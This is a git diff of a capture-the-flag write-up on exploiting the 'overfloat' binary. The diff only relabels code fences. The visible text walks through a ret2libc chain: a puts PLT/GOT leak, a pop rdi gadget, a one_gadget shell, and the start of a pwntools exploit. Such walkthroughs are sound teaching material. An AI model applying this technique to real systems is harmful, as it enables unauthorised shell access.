@@ -6,7 +6,7 @@ One thing about this challenge, it is supposed to be done with the `libc-2.27.so
 
 Let's take a look at the binary:
 
-```
+```console
 $	file overfloat 
 overfloat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=8ae8ef04d2948115c648531ee0c12ba292b92ae4, not stripped
 $	pwn checksec overfloat 
@@ -20,7 +20,7 @@ $	pwn checksec overfloat
 
 So we can see that it we are given a `64` bit dynamically linked binary, with a non-executable stack. In addition to that we are give the libc file `libc-2.27.so`. Running the program we see that it prompts us for latitude / longitude pairs:
 
-```
+```console
 $	./overfloat 
                                  _ .--.        
                                 ( `    )       
@@ -53,7 +53,7 @@ LAT[3]: Too Slow! Sorry :(
 
 When we look at the main function in Ghidra, we see this code:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -75,7 +75,7 @@ undefined8 main(void)
 
 Looking through the code here, we see that the part we are really interested about is `chart_course` function call, which takes the pointer `charBuf` as an argument. When we look at the `chart_course` disassembly in Ghidra, we see this: 
 
-```
+```c
 void chart_course(long ptr)
 
 {
@@ -126,7 +126,7 @@ To counter this, I would just setup a `puts` call(since `puts` is an imported fu
 
 Now we need to setup the first part of the infoleak. First find the plt address of puts `0x400690`:
 
-```
+```console
 objdump -D overfloat | grep puts
 0000000000400690 <puts@plt>:
   400690:	ff 25 8a 19 20 00    	jmpq   *0x20198a(%rip)        # 602020 <puts@GLIBC_2.2.5>
@@ -138,21 +138,21 @@ objdump -D overfloat | grep puts
 
 Next find the got entry address for puts:
 
-```
+```console
 $	objdump -R overfloat | grep puts
 0000000000602020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
 ```
 
 Finally we just need to gadget to pop an argument into the `rdi` register than return:
 
-```
+```console
 $	python ROPgadget.py --binary overfloat | grep "pop rdi"
 0x0000000000400a83 : pop rdi ; ret
 ```
 
 Also for the loop around address, I just tried the start of main and it worked. After we get the libc infoleak we can just subtract the offset of puts from it to get the libc base. The only part that remains is the onegadget. I just tried the first one and it worked (I decided to go with guess and check instead of checking the conditions when the gadget would be executed):
 
-```
+```console
 $	one_gadget libc-2.27.so 
 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
 constraints:
@@ -168,7 +168,7 @@ constraints:
 
 With that we have everything we need to build our exploit. Since all of our inputs are interpreted as floats, we have to jump through a few hoops in order to get our inputs correct:
 
-```
+```python
 from pwn import *
 import struct
 
